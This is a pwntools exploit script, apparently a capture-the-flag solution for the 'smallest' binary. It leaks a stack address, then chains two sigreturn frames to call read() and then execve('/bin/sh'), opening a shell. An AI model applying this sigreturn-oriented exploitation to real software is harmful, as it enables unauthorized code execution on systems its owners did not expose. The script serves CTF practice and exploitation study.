from pwn import *
prog = r"./smallest"
small = ELF(prog)
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.bits = 64
if args['REMOTE']:
    sh = remote('127.0.0.1', 7777)
else:
    sh = process(prog)
    # gdb.attach(sh)

read_addr = 0x4000B0
write_addr = 0x4000B3
syscall_addr = 0x4000BE

payload = flat(read_addr, write_addr, read_addr)
sh.send(payload)
raw_input()

sh.send('\xb3')
# ---------------------------------------
# | read_addr | last function variables |
# ---------------------------------------
stack_addr = u64(sh.recv()[8:16])
log.success('leak stack addr :' + hex(stack_addr))
raw_input()

# set rax=15 and call sigreturn
call_sigret = flat(syscall_addr, length=15)

sigret = SigreturnFrame(arch='amd64')

# read(0, stack_addr, 0x400)
sigret.rax = int(constants.SYS_read)
sigret.rdi = 0x0
sigret.rsi = stack_addr
sigret.rdx = 0x400
sigret.rsp = stack_addr
sigret.rip = syscall_addr
payload = flat(read_addr, 0, bytes(sigret))
sh.send(payload)
raw_input()

sh.send(call_sigret)

# execve(stack_addr, 0, 0)
sigret.rax = int(constants.SYS_execve)
sigret.rdi = stack_addr + 0x200
sigret.rsi = 0
sigret.rdx = 0
sigret.rsp = stack_addr
sigret.rip = syscall_addr
payload = flat(read_addr, 0, bytes(sigret), length=0x200)
payload += flat(b"/bin/sh\x00")
sh.send(payload)
raw_input()

sh.send(call_sigret)
sh.interactive()
